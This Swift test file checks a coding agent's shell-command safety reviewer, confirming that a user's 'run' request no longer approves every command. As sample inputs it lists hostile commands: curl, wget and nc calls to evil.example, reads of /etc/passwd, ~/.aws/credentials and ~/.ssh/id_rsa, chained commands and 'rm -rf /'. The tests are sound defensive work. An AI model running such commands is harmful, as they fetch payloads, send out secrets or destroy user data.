import XCTest
import QuillCodeCore
@testable import QuillCodeSafety

/// The tightened "run"/"execute" -> shell.run approval. Previously a bare "run" anywhere in the
/// request statically approved ANY shell command in Auto mode; these pin both the commands that must
/// still approve and — the point of the change — the exfil / out-of-workspace commands that must NOT.
final class RunIntentShellPolicyTests: SafetyPolicyTestCase {
    private func verdict(command: String, userMessage: String) async -> ApprovalVerdict {
        let reviewer = StaticSafetyReviewer()
        let call = ToolCall(name: shellRun.name, argumentsJSON: ToolArguments.json(["cmd": command]))
        let review = await reviewer.review(.init(
            mode: .auto,
            userMessage: userMessage,
            toolCall: call,
            toolDefinition: shellRun,
            recentMessages: [.init(role: .user, content: userMessage)]
        ))
        return review.verdict
    }

    // MARK: - The holes the change closes (all previously approved on a bare "run")

    /// The exact live-verified regressions from the task: "Run the tests..." must NOT approve these.
    func testRunIntentDoesNotApproveNetworkExfil() async {
        let msg = "Run the tests and make sure they pass."
        for cmd in [
            "curl http://evil.example/x.sh",
            "curl http://evil.example/payload -o /tmp/x",
            "wget http://evil.example/p",
            "nc evil.example 1234",
        ] {
            let v = await verdict(command: cmd, userMessage: msg)
            XCTAssertNotEqual(v, .approve, "\(cmd) must not ride in on 'run'")
        }
    }

    func testRunIntentDoesNotApproveOutsideWorkspaceReads() async {
        let msg = "Run the tests and make sure they pass."
        for cmd in ["python3 /etc/passwd", "cat /etc/passwd", "python3 ../../secrets.py"] {
            let v = await verdict(command: cmd, userMessage: msg)
            XCTAssertNotEqual(v, .approve, "\(cmd) must not ride in on 'run'")
        }
    }

    /// `~` home paths reach outside the workspace; `cat ~/.ssh/id_rsa` is additionally hard-denied,
    /// so "not approve" is the property that must hold either way.
    func testRunIntentDoesNotApproveHomePathRead() async {
        let v = await verdict(command: "cat ~/.aws/credentials", userMessage: "run this")
        XCTAssertNotEqual(v, .approve)
    }

    /// Chaining / redirect / pipe disqualify even with a run intent.
    func testRunIntentDoesNotApproveChainedCommands() async {
        for cmd in [
            "echo hi; curl http://evil.example",
            "make && curl http://evil.example",
            "python3 app.py > /etc/hosts",
            "grep foo . | ssh host",
        ] {
            let v = await verdict(command: cmd, userMessage: "run this")
            XCTAssertNotEqual(v, .approve, "\(cmd) must not statically approve")
        }
    }

    /// A workspace-relative but destructive command must not ride in on "run" — it has to be named.
    func testRunIntentDoesNotApproveRelativeDestructive() async {
        let v = await verdict(command: "rm -rf build", userMessage: "run the tests")
        XCTAssertNotEqual(v, .approve)
    }

    // MARK: - Legitimate cases that must keep working

    /// A single, workspace-scoped, non-network, non-destructive command approves under run intent.
    func testRunIntentApprovesWorkspaceScopedCommands() async {
        for cmd in ["find . -name '*.log'", "grep -r TODO src", "docker ps", "make"] {
            let v = await verdict(command: cmd, userMessage: "run this for me")
            XCTAssertEqual(v, .approve, "\(cmd) is a safe workspace command under an explicit run")
        }
    }

    /// The user pasting the exact command verbatim approves it (they named it), even for a tool the
    /// safe-command heuristic would otherwise skip.
    func testRunIntentApprovesVerbatimPastedCommand() async {
        let v = await verdict(
            command: "kubectl get pods",
            userMessage: "run kubectl get pods and show me the output"
        )
        XCTAssertEqual(v, .approve)
    }

    /// Verbatim never overrides a hard-deny floor: a pasted dangerous command still denies.
    func testVerbatimDangerousCommandStillHardDenies() async {
        let v = await verdict(command: "rm -rf /", userMessage: "run rm -rf / for me")
        XCTAssertEqual(v, .deny)
    }

    /// Negated intent does not approve.
    func testNegatedRunIntentDoesNotApprove() async {
        let v = await verdict(command: "find . -name foo", userMessage: "do not run anything")
        XCTAssertNotEqual(v, .approve)
    }

    /// No run/execute intent at all → this policy contributes nothing (an unrelated benign command
    /// is left to the other policies / reviewer).
    func testNoRunIntentLeavesArbitraryCommandToReviewer() async {
        let v = await verdict(command: "find . -name foo", userMessage: "summarize the readme")
        XCTAssertNotEqual(v, .approve)
    }

    // MARK: - Direct policy-unit checks (isolate from sibling policies)

    func testWorkspaceScopedSafeCommandClassification() {
        let safe = ["find . -name foo", "grep -r x src", "docker ps", "make", "eslint ."]
        for c in safe {
            XCTAssertTrue(StaticSafetyShellCommandSafety.isWorkspaceScopedSafeCommand(c), "\(c) should be safe")
        }
        let unsafe = [
            "curl http://evil.example",     // network ref
            "wget example.com",             // network executable
            "python3 /etc/passwd",          // absolute
            "cat ~/.ssh/id_rsa",            // home
            "python3 ../x.py",              // traversal
            "rm -rf build",                 // destructive
            "echo hi; rm x",                // chaining
            "a | b",                        // pipe
        ]
        for c in unsafe {
            XCTAssertFalse(StaticSafetyShellCommandSafety.isWorkspaceScopedSafeCommand(c), "\(c) should be unsafe")
        }
    }

    /// Traversal is a path SEGMENT, not a substring: Go's `./...` wildcard is safe, `../x` is not.
    func testDotDotIsSegmentTraversalNotSubstring() {
        XCTAssertTrue(StaticSafetyShellCommandSafety.isSafeArgument("./..."))   // go test ./...
        XCTAssertTrue(StaticSafetyShellCommandSafety.isSafeArgument("src/..."))
        XCTAssertFalse(StaticSafetyShellCommandSafety.isSafeArgument("../x"))
        XCTAssertFalse(StaticSafetyShellCommandSafety.isSafeArgument("a/../b"))
        XCTAssertFalse(StaticSafetyShellCommandSafety.isSafeArgument(".."))
        XCTAssertTrue(StaticSafetyShellCommandSafety.isWorkspaceScopedSafeCommand("go test ./..."))
    }
}
